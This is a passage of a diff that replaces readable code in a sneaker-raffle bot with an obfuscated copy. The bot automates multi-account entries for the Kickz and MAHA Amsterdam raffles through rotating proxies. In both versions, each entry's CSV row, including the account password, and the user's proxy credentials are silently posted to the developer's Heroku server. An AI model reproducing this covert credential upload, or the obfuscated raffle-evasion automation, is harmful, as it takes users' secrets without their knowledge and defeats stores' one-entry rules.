-                                "type": "rich",
-                                "title": `Succesful Kickz Entry`,
-                                "description": "",
-                                "color": 0xc0d6d6,
-                                "fields": [
-                                    {
-                                        "name": `User`,
-                                        "value": `${username}`
-                                    },
-                                    {
-                                        "name": `Product`,
-                                        "value": `${kickz[i].Url}`
-                                    },
-                                    {
-                                        "name": `Size`,
-                                        "value": `${kickz[i].Size}`
-                                    },
-                                    {
-                                        "name": `Delay`,
-                                        "value": `${settings.delay}`
-                                    },
-                                    {
-                                        "name": `Version`,
-                                        "value": `${version}`
-                                    }
-                                ]
-                            }
-                        ]
-
-                        var succesDEV = await makeEmbed(kickz[i], currentFunction, 'dev', false);
-                        var succesPUB = await makeEmbed(kickz[i], currentFunction, 'pub', false);
-
-                        const EMBEDS =
-                        {
-                            succesDEVMSG: { embeds: [succesDEV] },
-                            succesPUBMSG: { embeds: [succesPUB] }
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x57a3d5 = 0x0; _0x57a3d5 < _0x453f92['length']; _0x57a3d5++) {
+                        var _0xe494ce;
+                        if (_0x508e22 != 'yes')
+                            var _0x508e22 = '', _0xa4a705 = 0x0;
+                        _0x244762(_0x59e332['name'] + '\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20/\x20' + _0x453f92['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                        var _0x19e60b = [{
+                            'type': 'rich',
+                            'title': 'Succesful\x20Kickz\x20Entry',
+                            'description': '',
+                            'color': 0xc0d6d6,
+                            'fields': [
+                                {
+                                    'name': 'User',
+                                    'value': '' + _0x358285
+                                },
+                                {
+                                    'name': 'Product',
+                                    'value': '' + _0x453f92[_0x57a3d5]['Url']
+                                },
+                                {
+                                    'name': 'Size',
+                                    'value': '' + _0x453f92[_0x57a3d5]['Size']
+                                },
+                                {
+                                    'name': 'Delay',
+                                    'value': '' + _0x51d52a['delay']
+                                },
+                                {
+                                    'name': 'Version',
+                                    'value': '' + _0x3b2d4c
+                                }
+                            ]
+                        }], _0x5f4243 = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'dev', ![]), _0x1daef8 = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'pub', ![]);
+                        const _0x1da432 = {
+                            'succesDEVMSG': { 'embeds': [_0x5f4243] },
+                            'succesPUBMSG': { 'embeds': [_0x1daef8] }
                         };
-                        // const msg = { embeds: embed };
                         try {
-                            await jig(kickz, i);
-
+                            await _0x2c2316(_0x453f92, _0x57a3d5);
                         } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                            _0x508e22 = 'no';
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                         }
-                        if (kickz[i].Email == '' || kickz[i].Password == '' || kickz[i].FirstName == '' || kickz[i].LastName == '') {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
+                        if (_0x453f92[_0x57a3d5]['Email'] == '' || _0x453f92[_0x57a3d5]['Password'] == '' || _0x453f92[_0x57a3d5]['FirstName'] == '' || _0x453f92[_0x57a3d5]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                             continue;
                         }
-
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x5135c5 = _0x164140[_0x57a3d5]['split'](':');
+                        else
+                            var _0x5305d1 = Math['round'](Math['random']() * (_0x164140['length'] - 0x1)), _0x5135c5 = _0x164140[_0x5305d1]['split'](':');
+                        var _0x1d37e5;
                         try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: !true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x1d37e5 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !!![],
+                                'args': [
+                                    '--proxy-server=' + _0x5135c5[0x0] + ':' + _0x5135c5[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
-
                         } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: !true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x1d37e5 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !!![],
+                                'args': [
+                                    '--proxy-server=' + _0x5135c5[0x0] + ':' + _0x5135c5[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
                         }
                         try {
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            await page.goto(`${kickz[i].Url}`, { waitUntil: 'networkidle2' });
-                            await delay(300);
-                            await page.waitForSelector('#consent-dialog > section > button');
-                            await page.click('#consent-dialog > section > button');
-                            await delay(2000);
+                            const _0x1777e7 = await _0x1d37e5['newPage']();
+                            await _0x1777e7['authenticate']({
+                                'username': '' + _0x5135c5[0x2],
+                                'password': '' + _0x5135c5[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1777e7['setRequestInterception'](!![]), _0x1777e7['on']('request', _0x20f627 => {
+                                _0x20f627['resourceType']() === 'image' || _0x20f627['resourceType']() === 'font' || _0x20f627['resourceType']() === 'media' ? _0x20f627['abort']() : _0x20f627['continue']();
+                            }), await _0x1777e7['goto']('' + _0x453f92[_0x57a3d5]['Url'], { 'waitUntil': 'networkidle2' }), await _0x116d4a(0x12c), await _0x1777e7['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1777e7['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x116d4a(0x7d0);
                             try {
-                                await page.click('a[title="Sign In"]');
+                                await _0x1777e7['click']('a[title=\x22Sign\x20In\x22]');
                             } catch {
-                                await page.click('a[title="sign in"]');
+                                await _0x1777e7['click']('a[title=\x22sign\x20in\x22]');
                             }
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Logging in`);
-                            await page.waitForSelector('#username');
-                            await page.type('#username', kickz[i].Email);
-                            await page.waitForSelector('#password');
-                            await page.type('#password', kickz[i].Password);
-                            await delay(400);
-                            await page.click('#buttonSubmit');
-                            await page.waitForSelector('.b-variation_swatch-value_overlay');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Product`);
-                            await delay(500);
-                            // await page.goto(`${kickz[i].Url}`, { waitUntil: 'networkidle2' });
-                            // await delay(200000)
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Choosing size ${kickz[i].Size}`);
-                            let size = kickz[i].Size.replace('.5', ' 1/2');
-                            if (size.toUpperCase() == 'RANDOM') {
-                                const sizeButtons = await page.$$('.b-variations_item-content.m-list > button');
-                                var randomSize = Math.round(Math.random() * (sizeButtons.length - 1));
-                                await sizeButtons[randomSize].click();
-                            } else {
-
-                                await page.click(`button[aria-label="${size}"]`)
-                            }
-                            await delay(500);
+                            console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1777e7['waitForSelector']('#username'), await _0x1777e7['type']('#username', _0x453f92[_0x57a3d5]['Email']), await _0x1777e7['waitForSelector']('#password'), await _0x1777e7['type']('#password', _0x453f92[_0x57a3d5]['Password']), await _0x116d4a(0x190), await _0x1777e7['click']('#buttonSubmit'), await _0x1777e7['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x453f92[_0x57a3d5]['Size']);
+                            let _0x1cfe51 = _0x453f92[_0x57a3d5]['Size']['replace']('.5', '\x201/2');
+                            if (_0x1cfe51['toUpperCase']() == 'RANDOM') {
+                                const _0x2787c5 = await _0x1777e7['$$']('.b-variations_item-content.m-list\x20>\x20button');
+                                var _0x739fea = Math['round'](Math['random']() * (_0x2787c5['length'] - 0x1));
+                                await _0x2787c5[_0x739fea]['click']();
+                            } else
+                                await _0x1777e7['click']('button[aria-label=\x22' + _0x1cfe51 + '\x22]');
+                            await _0x116d4a(0x1f4);
                             try {
-                                await page.click('button[data-tau="add_new_address"]');
+                                await _0x1777e7['click']('button[data-tau=\x22add_new_address\x22]');
                             } catch {
-
                             }
-                            await delay(300);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling Information`);
-                            await page.select('#dwfrm_raffle_addressFields_salutation', 'mr');
-                            await delay(300);
-                            await page.type('#dwfrm_raffle_addressFields_firstName', kickz[i].FirstName);
-                            await delay(300);
-                            await page.type('#dwfrm_raffle_addressFields_lastName', kickz[i].LastName);
-                            await delay(300);
-                            await page.select('#dwfrm_raffle_addressFields_country', kickz[i].Country);
-                            await delay(300);
-                            await page.type('#dwfrm_raffle_addressFields_city', kickz[i].City);
-                            await delay(300);
-                            if (kickz[i].Postcode == undefined) {
-                                kickz[i].Postcode = kickz[i].Zip
-                            }
-                            await page.type('#dwfrm_raffle_addressFields_postalCode', kickz[i].Postcode);
-                            await delay(300);
-                            await page.type('#dwfrm_raffle_addressFields_address1', kickz[i].Address1);
-                            await delay(300);
-                            await page.type('#dwfrm_raffle_addressFields_address2', kickz[i].HouseNumber);
-                            await delay(300);
-                            await page.type('#dwfrm_raffle_addressFields_additionalAddressInfo', kickz[i].Address2);
-                            await delay(300);
-                            await page.click('#dwfrm_raffle_addressFields_saveAddress');
-                            await delay(300);
-                            await page.type('#dwfrm_raffle_raffleSpecificFields_instagramAccount', kickz[i].Follower);
-                            await delay(500);
-                            await page.click('#dwfrm_raffle_raffleSpecificFields_consentOnConditions')
-                            await delay(500);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${chalk.blue('Awaiting Paypal Payment')}`);
-                            await page.click('.b-paypal_button');
+                            await _0x116d4a(0x12c), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1777e7['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_firstName', _0x453f92[_0x57a3d5]['FirstName']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_lastName', _0x453f92[_0x57a3d5]['LastName']), await _0x116d4a(0x12c), await _0x1777e7['select']('#dwfrm_raffle_addressFields_country', _0x453f92[_0x57a3d5]['Country']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_city', _0x453f92[_0x57a3d5]['City']), await _0x116d4a(0x12c);
+                            _0x453f92[_0x57a3d5]['Postcode'] == undefined && (_0x453f92[_0x57a3d5]['Postcode'] = _0x453f92[_0x57a3d5]['Zip']);
+                            await _0x1777e7['type']('#dwfrm_raffle_addressFields_postalCode', _0x453f92[_0x57a3d5]['Postcode']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_address1', _0x453f92[_0x57a3d5]['Address1']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_address2', _0x453f92[_0x57a3d5]['HouseNumber']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x453f92[_0x57a3d5]['Address2']), await _0x116d4a(0x12c), await _0x1777e7['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x453f92[_0x57a3d5]['Follower']), await _0x116d4a(0x1f4), await _0x1777e7['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20' + _0x1403a4['blue']('Awaiting\x20Paypal\x20Payment')), await _0x1777e7['click']('.b-paypal_button');
                             try {
-                                await page.waitForSelector('.b-raffle-message.m-success', { timeout: 300000 });
-                                retry = 'no';
-                                successfulLog(kickz[i], currentFunction);
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                }
-                                await delay(200);
-                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                await delay(200);
-                                await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                let task = kickz[i]
+                                await _0x1777e7['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x508e22 = 'no', _0x523ce4(_0x453f92[_0x57a3d5], _0x59e332), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1da432['succesDEVMSG']);
+                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x1da432['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x1da432['succesPUBMSG']);
+                                let _0x42cb14 = _0x453f92[_0x57a3d5];
                                 try {
                                     prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
+                                        'username': _0x358285['replace']('#', ''),
+                                        'module': _0x59e332['name'],
+                                        'entrydata': JSON['stringify'](_0x42cb14),
+                                        'proxy': '' + _0x164140[_0x57a3d5]
+                                    };
+                                    var _0x4ca88e = JSON['stringify'](prxdata);
+                                    let _0x35cdd7 = { 'headers': { 'content-type': 'application/json' } };
+                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x4ca88e, _0x35cdd7);
+                                } catch (_0x17fd47) {
                                 }
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Paypal Error: ${e}`))
-                                ERROR = `Error while entering Paypal: ${e}`
-                                var errorDEV = await makeEmbed(kickz[i], currentFunction, 'dev', true, ERROR);
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
+                            } catch (_0x163a14) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x163a14)), _0xe494ce = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x163a14;
+                                var _0x2e989c = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'dev', !![], _0xe494ce);
+                                _0x1da432['errorDEV'] = { 'embeds': [_0x2e989c] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1da432['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1da432['errorDEV']);
                             }
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                            ERROR = `${e}`
-                            var errorDEV = await makeEmbed(kickz[i], currentFunction, 'dev', true, ERROR);
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-                            retry = 'yes';
+                        } catch (_0x1f7185) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20' + _0x1f7185)), _0xe494ce = '' + _0x1f7185;
+                            var _0x2e989c = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'dev', !![], _0xe494ce);
+                            _0x1da432['errorDEV'] = { 'embeds': [_0x2e989c] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1da432['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1da432['errorDEV']), _0x508e22 = 'yes';
                         } finally {
-                            if (browser) {
-                                browser.close();
-                            }
-                            if (retry == 'yes' && t != 5) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
+                            _0x1d37e5 && _0x1d37e5['close']();
+                            if (_0x508e22 == 'yes' && _0xa4a705 != 0x5) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Retrying\x20(' + _0xa4a705 + '\x20/\x205)')), _0x57a3d5 = _0x57a3d5 - 0x1, _0xa4a705 = _0xa4a705 + 0x1;
                                 continue;
                             }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(kickz[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            console.log(`Waiting for ${settings.AfewDelay} ms`);
-                            await delay(settings.AfewDelay);
+                            _0x508e22 == 'yes' && _0xa4a705 >= 0x5 && (_0x5925c7(_0x453f92[_0x57a3d5], _0x59e332), _0x508e22 = 'no', _0xa4a705 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['AfewDelay'] + '\x20ms'), await _0x116d4a(_0x51d52a['AfewDelay']);
                         }
                     }
                 }
@@ -6313,2504 +3588,1221 @@ const modules = [
         ]
     },
     {
-        name: "MAHA Amsterdam",
-
-        modules: [
+        'name': 'MAHA\x20Amsterdam',
+        'modules': [
             {
-                name: "MAHA Raffle Entries",
-                store: 'MAHA',
-                logo: 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
-                url: 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
-                data: {
-                    data: {
-                        type: "subscription",
-                        attributes: {
-                            list_id: 'YqtGfh',
-                            custom_source: "Air Jordan 4 Retro Thunder (2023)",
-                            email: ``,
-                            properties: {
-                                $address1: "",
-                                $city: "",
-                                $country: "",
-                                $first_name: "",
-                                $last_name: "",
-                                $zip: "",
-                                $consent_method: "Klaviyo Form",
-                                $consent_form_id: "Taryg7",
-                                $consent_form_version: 9174950
-                                ,
-                                'Instagram Handle': ``,
-                                Shipping: 'Shipping',
-                                Size: '',
-                                services: '{\"shopify\":{\"source\":\"form\"}}',
-                                $timezone_offset: 2,
-                            },
-                        },
-                    },
-                },
-                headers: {
-                    'accept': "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "access-control-allow-headers": "*",
-                    "content-type": "application/json",
-                    "origin": "https://www.maha-amsterdam.com",
-                    "referer": "https://www.maha-amsterdam.com/",
-                    "revision": "2022-02-16",
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-                    'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": "'Windows'",
-                    "sec-fetch-dest": "empty",
-                    "sec-fetch-mode": "cors",
-                    "sec-fetch-site": "cross-site",
-                },
-                function: async function (currentFunction, oqium, proxies) {
-                    for (var i = 0; i < oqium.length; i++) {
-                        try {
-                            await jig(oqium, i);
-
-                        } catch {
-
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                'name': 'MAHA\x20Raffle\x20Entries',
+                'store': 'MAHA',
+                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
+                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
+                'data': {
+                    'data': {
+                        'type': 'subscription',
+                        'attributes': {
+                            'list_id': 'YqtGfh',
+                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
+                            'email': '',
+                            'properties': {
+                                '$address1': '',
+                                '$city': '',
+                                '$country': '',
+                                '$first_name': '',
+                                '$last_name': '',
+                                '$zip': '',
+                                '$consent_method': 'Klaviyo\x20Form',
+                                '$consent_form_id': 'Taryg7',
+                                '$consent_form_version': 0x8bffa6,
+                                'Instagram\x20Handle': '',
+                                'Shipping': 'Shipping',
+                                'Size': '',
+                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
+                                '$timezone_offset': 0x2
+                            }
                         }
-                        async function oqiumFunction(i, mode, currentFunction, oqium, proxies) {
-                            var ERROR;
-                            var data = {};
-                            var embed = [];
-                            var msg = {};
-                            var sizeArray = [
-                                '40', '40.5', '41', '42', '42.5', '43', '44', '45', '45.5', '46', '47', '47.5', '48'
-                            ]
-                            var randomSize = Math.round(Math.random() * (sizeArray.length - 1));
-
-                            if (!oqium) {
-                                oqium = {
-
-                                };
-                            }
-                            if (mode != 'ver') {
-                                setTitle(`${currentFunction.name} Task ${i + 1} / ${oqium.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                                await jig(oqium, i);
-
-                                data = currentFunction.data;
-
-
-                                data.data.attributes.email = `${oqium[i].Email}`;
-
-                                if (oqium[i].Size == 'RANDOM') {
-
+                    }
+                },
+                'headers': {
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip,\x20deflate,\x20br',
+                    'access-control-allow-headers': '*',
+                    'content-type': 'application/json',
+                    'origin': 'https://www.maha-amsterdam.com',
+                    'referer': 'https://www.maha-amsterdam.com/',
+                    'revision': '2022-02-16',
+                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
+                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '\x27Windows\x27',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'cross-site'
+                },
+                'function': async function (_0x1a05ed, _0x110fd3, _0x3eb274) {
+                    for (var _0x3dc2f7 = 0x0; _0x3dc2f7 < _0x110fd3['length']; _0x3dc2f7++) {
+                        try {
+                            await _0x2c2316(_0x110fd3, _0x3dc2f7);
+                        } catch {
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                        }
+                        async function _0x823b0f(_0x28552c, _0x27bc85, _0x51e7aa, _0x321de9, _0x1cbe54) {
+                            var _0x3eb07a, _0x4cdd38 = {}, _0x575873 = [], _0x1d1a97 = {}, _0x308d44 = [
+                                '40',
+                                '40.5',
+                                '41',
+                                '42',
+                                '42.5',
+                                '43',
+                                '44',
+                                '45',
+                                '45.5',
+                                '46',
+                                '47',
+                                '47.5',
+                                '48'
+                            ], _0x1658d9 = Math['round'](Math['random']() * (_0x308d44['length'] - 0x1));
+                            !_0x321de9 && (_0x321de9 = {});
+                            if (_0x27bc85 != 'ver') {
+                                _0x244762(_0x51e7aa['name'] + '\x20Task\x20' + (_0x28552c + 0x1) + '\x20/\x20' + _0x321de9['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7), await _0x2c2316(_0x321de9, _0x28552c), _0x4cdd38 = _0x51e7aa['data'], _0x4cdd38['data']['attributes']['email'] = '' + _0x321de9[_0x28552c]['Email'];
+                                if (_0x321de9[_0x28552c]['Size'] == 'RANDOM') {
                                 }
-
-                                data.data.attributes.properties.$first_name = `${oqium[i].FirstName}`;
-                                data.data.attributes.properties.$last_name = `${oqium[i].LastName}`;
-                                data.data.attributes.properties.$address1 = `${oqium[i].Address1} ${oqium[i].Address2} ${oqium[i].HouseNumber}`;
-                                data.data.attributes.properties.$zip = `${oqium[i].Zip}`;
-                                data.data.attributes.properties.$city = `${oqium[i].City}`;
-                                data.data.attributes.properties.$country = `${oqium[i].Country}`;
-                                if (
-                                    oqium[i].Size == 'RANDOM'
-                                ) {
-                                    // oqium[i].Size = sizeArray[randomSize]
-                                    data.data.attributes.properties.Size = `US W / EU ${sizeArray[randomSize]}`;
-                                }
-                                else {
-
-                                    data.data.attributes.properties.Size = `US W / EU ${oqium[i].Size}`;
-                                }
-                                data.data.attributes.properties.$phone_number = `${oqium[i].Phone}`;
-                                data.data.attributes.properties['Instagram Account'] = `${oqium[i].Follower}`;
+                                _0x4cdd38['data']['attributes']['properties']['$first_name'] = '' + _0x321de9[_0x28552c]['FirstName'], _0x4cdd38['data']['attributes']['properties']['$last_name'] = '' + _0x321de9[_0x28552c]['LastName'], _0x4cdd38['data']['attributes']['properties']['$address1'] = _0x321de9[_0x28552c]['Address1'] + '\x20' + _0x321de9[_0x28552c]['Address2'] + '\x20' + _0x321de9[_0x28552c]['HouseNumber'], _0x4cdd38['data']['attributes']['properties']['$zip'] = '' + _0x321de9[_0x28552c]['Zip'], _0x4cdd38['data']['attributes']['properties']['$city'] = '' + _0x321de9[_0x28552c]['City'], _0x4cdd38['data']['attributes']['properties']['$country'] = '' + _0x321de9[_0x28552c]['Country'], _0x321de9[_0x28552c]['Size'] == 'RANDOM' ? _0x4cdd38['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x308d44[_0x1658d9] : _0x4cdd38['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x321de9[_0x28552c]['Size'], _0x4cdd38['data']['attributes']['properties']['$phone_number'] = '' + _0x321de9[_0x28552c]['Phone'], _0x4cdd38['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x321de9[_0x28552c]['Follower'];
                             }
-
-                            if (settings.useRandomProxy = false) {
-                                var proxySplit = proxies[i].split(":");
-                            } else {
-                                var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                                var proxySplit = proxies[randomProxy].split(":");
-                            }
-
-
-
-                            var options = {
-                                jar: j,
-                                followAllRedirects: true,
-                                method: 'POST',
-                                url: currentFunction.url,
-                                headers: currentFunction.headers,
-                                body: JSON.stringify(data),
-                                proxy: `http://${proxySplit[2]}:${proxySplit[3]}@${proxySplit[0]}:${proxySplit[1]}`,
+                            if (_0x51d52a['useRandomProxy'] = ![])
+                                var _0x205e29 = _0x1cbe54[_0x28552c]['split'](':');
+                            else
+                                var _0x6a3822 = Math['round'](Math['random']() * (_0x1cbe54['length'] - 0x1)), _0x205e29 = _0x1cbe54[_0x6a3822]['split'](':');
+                            var _0x2a27cf = {
+                                'jar': _0x103baf,
+                                'followAllRedirects': !![],
+                                'method': 'POST',
+                                'url': _0x51e7aa['url'],
+                                'headers': _0x51e7aa['headers'],
+                                'body': JSON['stringify'](_0x4cdd38),
+                                'proxy': 'http://' + _0x205e29[0x2] + ':' + _0x205e29[0x3] + '@' + _0x205e29[0x0] + ':' + _0x205e29[0x1]
                             };
-                            if (mode != 'ver') {
-                                options.url = currentFunction.url
-                                options.headers = currentFunction.headers
-                            }
-                            if (mode == 'ver') {
-                                options.method = 'GET';
-                            }
-                            return new Promise(function (resolve, reject) {
-                                callback = async (err, res, body) => {
-
-                                    if (!err && res.statusCode == 202 || !err && res.statusCode == 200) {
-                                        if (mode != 'ver') {
-                                            var succesDEV = await makeEmbed(oqium[i], currentFunction, 'dev', false);
-                                            var succesPUB = await makeEmbed(oqium[i], currentFunction, 'pub', false);
-                                            const EMBEDS =
-                                            {
